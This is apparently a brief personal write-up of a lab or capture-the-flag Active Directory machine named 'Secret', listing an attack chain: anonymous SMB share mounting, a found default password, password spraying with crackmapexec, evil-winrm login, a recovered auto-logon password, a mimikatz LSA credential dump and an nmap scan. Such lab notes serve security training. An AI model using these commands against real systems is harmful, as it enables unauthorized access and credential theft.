---
title: Secret
created: '2020-07-05T13:25:09.540Z'
modified: '2020-07-05T14:04:29.878Z'
---

# Secret
- IP: `172.31.1.4`
- OS: `Active Directory`
## Enumeration
### Writeup
`mount -t cifs -o username=anything,password= //172.31.1.4/Office_Share /mnt/Office_Share`
In the share we find this default password: `SecretOrg!`
`crackmapexec smb 172.31.1.4 -u formatted_name_wordlist.txt -p 'SecretOrg!' --shares`
`evil-winrm -i 172.31.1.4 -u jcakes -p 'SecretOrg!'`

Auto-logon credentials: `vF4$x9#z:-eT~Fy`

`./mimikatz.exe "privilege::debug" "lsadump::lsa /patch" "exit"`
### Commands
<details>
<summary>nmap</summary>

- `nmap -p 1-65535 -T4 -A -v 172.31.1.4`
```

```
</details>

<details>
<summary></summary>

- ``
```

```
</details>
